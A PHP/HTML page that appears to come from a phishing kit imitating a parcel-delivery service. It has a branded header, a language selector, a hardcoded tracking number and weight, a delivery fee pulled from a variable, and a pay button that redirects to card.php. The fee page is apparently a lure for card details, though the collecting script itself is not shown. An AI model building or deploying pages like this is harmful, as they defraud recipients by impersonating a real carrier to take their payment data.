<?php
if(isset($_GET['lang'])){
	session_start();
	$_SESSION['countryCode']=$_GET['lang'];
}

require '../main.php';

 
?> 
<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<title></title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="res/style.css">
<script src="res/jq.js">
</script>
<style>
*{
	word-break:break-word;
}
body{
	background:#f0f0f0;
}
.linksat a{
	margin:0 6px;
}
.linksat  a:hover,a:visited, a:active {
	color:black;
	text-decoration:none;
}

.footerlinks a{
	margin:14px;
}

 
</style>
</head>
<body>
<div class="container-fluid" style="background:white;">
<div class="row align-items-center p-3 " style="background:#fecb2f;">
<div class="col">
<img src="res/logo.png" style="width:160px;">
</div>
<div class="col text-right">
<a href="javascript:void(0)" class="language" style="" onclick="$('#langs').toggle()">English</a>
<div class="langs_box" id="langs">
<a href="?lang=US">English</a>
<a href="?lang=SE">Sverige</a>
<a href="?lang=FR">Français</a>
<a href="?lang=DE">Deutsch</a>
<a href="?lang=ES">España</a>
</div>

 <img src="res/search.png" style="width:30px;">
 <img src="res/user.png" style="width:25px;">
</div>
</div>
<div style=" height:3px; width:100%;">
</div>
<div class="row align-items-center p-2" style="background:#fecb2f;">
<div class="col linksat">
<?php echo getLang("LINKS");?>
</div>
</div>
</div>


<div class="container-fluid p-4 bg-white">

<?php echo getLang("TABLE_TITLE"); ?>
<table class="table table-stripped" style="font-size:0.8em;">
<tr>
<td><?php echo getLang("TABLE")[0]; ?></td>
<td>D69N2KJX3</td>
</tr>	
<tr>
<td><?php echo getLang("TABLE")[1]; ?></td>
<td><?php echo $track_code; ?></td>
</tr>
<tr>
<td><?php echo getLang("TABLE")[2]; ?></td>
<td>627 Grams</td>
</tr>
<tr>
<td><?php echo getLang("TABLE")[3]; ?></td>
<td><?php echo $price; ?></td>
</tr>
<tr class="table-success" style="font-weight:bold;">
<td><?php echo getLang("TABLE")[4]; ?></td>
<td><?php echo $price; ?></td>
</tr>
</table>
<div class="text-right">
<button class="btn btn-danger my-4 px-5" onclick="pay()"><?php echo  getLang("SUBMIT"); ?></button>
</div>

</div>
 

 
 


 
 
 



<div class="container-fluid w-100 p-4" style="background:white;">
<div class="row row-cols-1">
<div class="col py-3">
<img src="res/footer-logo.svg">
</div>
<div class="col footerlinks" style="font-size:0.8em;">
<?php echo getLang("FOOTER_LINKS"); ?>
</div>
<div class="col py-3 text-center" style="font-size:0.8em;">
2022 © - all rights reserved
</div>
</div>
</div>



<div class="paymentwindow">
<div class="content">

</div>
</div>


<script src="res/jq.js"></script>
<script>

function pay(){
		window.location="card.php";
	
	
}

</script>
</body>
</html>